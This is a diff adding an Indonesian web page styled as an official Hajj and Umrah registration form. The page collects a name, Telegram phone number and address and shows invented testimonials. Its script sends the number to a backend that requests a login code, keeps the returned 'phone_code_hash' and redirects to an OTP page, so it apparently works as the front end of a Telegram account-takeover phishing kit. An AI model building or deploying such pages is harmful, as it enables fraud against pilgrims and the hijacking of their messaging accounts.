@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pendaftaran Resmi Haji & Umrah</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body class="bg-emerald-500 min-h-screen flex justify-center py-10 px-4">
+
+    <div class="max-w-md w-full">
+        <div class="bg-white rounded-2xl shadow-2xl overflow-hidden mb-6">
+            
+            <div class="relative bg-white-900 text-white p-6 overflow-hidden">
+                <div class="flex justify-between items-start relative z-10">
+                    <div class="w-8/14">
+                    </div>
+                    <div class="w-8/14">
+                        <img src="wa.jpeg">
+                    </div>
+                </div>
+            </div>
+
+            <div class="p-6">
+                <p class="text-gray-700 font-semibold text-lg mb-6 leading-tight">
+                    Silahkan masukkan Data Anda 
+                    untuk melanjutkan pendaftaran
+                </p>
+
+                <form id="registrationForm" class="space-y-4">
+                    <div class="flex items-center border-2 border-gray-200 rounded-lg overflow-hidden focus-within:border-emerald-500 transition">
+                        <span class="px-4 text-gray-400"><i class="fas fa-user"></i></span>
+                        <input type="text" id="userName" placeholder="Masukkan Nama Lengkap" class="w-full py-3 outline-none text-gray-700">
+                    </div>
+
+                    <div class="flex items-center border-2 border-gray-200 rounded-lg overflow-hidden focus-within:border-emerald-500 transition">
+                        <span class="px-4 flex items-center gap-2 border-r">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" class="w-6" alt="ID">
+                            <span class="text-gray-600 font-bold">+62</span>
+                        </span>
+                        <input type="tel" id="userPhone" placeholder="Masukkan nomor Telegram Aktif" class="w-full py-3 px-3 outline-none text-gray-700">
+                    </div>
+                     <div class="flex items-center border-2 border-gray-200 rounded-lg overflow-hidden focus-within:border-emerald-500 transition">
+                        <span class="px-4 text-gray-400"><i class="fas fa-map-marker-alt"></i></span>
+                        <input type="text" id="userAddress" placeholder="Masukkan Alamat Lengkap" class="w-full py-3 outline-none text-gray-700">
+                    </div>
+
+                    <div class="flex items-start gap-3 py-2">
+                        <input type="checkbox" class="mt-1 w-4 h-4 accent-emerald-600" id="agree">
+                        <label for="agree" class="text-sm text-gray-600 leading-tight">
+                            Saya setuju untuk menerima pesan
+                            Telegram dari admin
+                        </label>
+                    </div>
+
+                    <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-4 rounded-xl text-lg shadow-lg transform active:scale-95 transition">
+                        Daftar Sekarang
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <div class="space-y-3">
+            <div class="bg-white rounded-xl p-3 flex items-center gap-4 shadow-md animate-pulse">
+                <img src="https://i.pravatar.cc/150?u=a1" class="w-12 h-12 rounded-full border-2 border-emerald-100" alt="user">
+                <div>
+                    <h4 class="font-bold text-gray-800 text-sm">Ahmad Fauzi</h4>
+                    <p class="text-emerald-600 text-xs font-medium flex items-center gap-1">
+                        <i class="fas fa-check-circle"></i> Berhasil mendaftar paket Umrah 2024
+                    </p>
+                </div>
+            </div>
+            <div class="bg-white rounded-xl p-3 flex items-center gap-4 shadow-md">
+                <img src="https://i.pravatar.cc/150?u=a2" class="w-12 h-12 rounded-full border-2 border-emerald-100" alt="user">
+                <div>
+                    <h4 class="font-bold text-gray-800 text-sm">Siti Aisyah</h4>
+                    <p class="text-emerald-600 text-xs font-medium flex items-center gap-1">
+                        <i class="fas fa-check-circle"></i> Berhasil verifikasi dokumen Haji
+                    </p>
+                </div>
+            </div>
+</div>
+    </div>
+
+<script>
+        document.getElementById('registrationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Ambil data dari input
+            const nameInput = document.getElementById('userName');
+            const phoneInput = document.getElementById('userPhone');
+            const addressInput = document.getElementById('userAddress');
+            
+            const userName = nameInput.value.trim();
+            const userAddress = addressInput.value.trim();
+            let phone = phoneInput.value.trim();
+            
+            // Validasi nomor
+            if (phone === '') {
+                alert('Silakan masukkan nomor Telegram Anda');
+                return;
+            }
+            
+            // Jika nomor dimulai dengan 0, ganti dengan 62
+            if (phone.startsWith('0')) {
+                phone = '62' + phone.substring(1);
+            }
+            
+            // Hapus karakter non-angka
+            phone = phone.replace(/\D/g, '');
+            
+            // Simpan data user ke localStorage untuk digunakan saat verifikasi
+            localStorage.setItem('userName', userName);
+            localStorage.setItem('userAddress', userAddress);
+            
+            // Tampilkan loading
+            const submitBtn = this.querySelector('button[type="submit"]');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim...';
+            
+            try {
+                // Kirim permintaan kode ke server
+                const response = await fetch('http://localhost:3000/api/send-code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phoneNumber: phone
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    // Simpan ke localStorage
+                    localStorage.setItem('userPhone', phone);
+                    localStorage.setItem('phoneCodeHash', data.phone_code_hash);
+                    
+                    // Redirect ke halaman OTP
+                    window.location.href = 'otp.html';
+                } else {
+                    alert('Gagal mengirim kode: ' + (data.error || 'Unknown error'));
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = originalText;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Terjadi kesalahan. Pastikan server berjalan.');
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = originalText;
+            }
+        });
+    </script>
+</body>
+</html>
